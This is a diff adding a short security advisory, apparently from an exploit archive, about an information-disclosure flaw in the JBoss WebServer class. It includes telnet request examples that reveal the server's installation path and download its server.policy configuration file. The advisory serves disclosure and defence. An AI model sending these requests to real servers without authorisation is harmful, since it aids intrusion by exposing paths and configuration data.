@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/13985/info
+
+JBoss is prone to a remote information-disclosure vulnerability. The issue occurs in the 'org.jboss.web.WebServer' class and is due to a lack of sufficient sanitization of user-supplied request data.
+
+Information that attackers can harvest through leveraging this issue may aid in further attacks against the affected service. 
+
+Example 1 (Installation path disclosure): [3.2.x and 4.0.2]
+Request:
+>>telnet [jbosshost] 8083
+>>GET %. HTTP/1.0
+
+Reply:
+HTTP/1.0 400 C:\Programme\jboss-4.0.2\server\default\conf (Zugriff
+verweigert)
+Content-Type: text/html
+
+Example 2 (Config file download): [4.0.2]
+Request:
+>>telnet [jbosshost] 8083
+>>GET %server.policy HTTP/1.0 
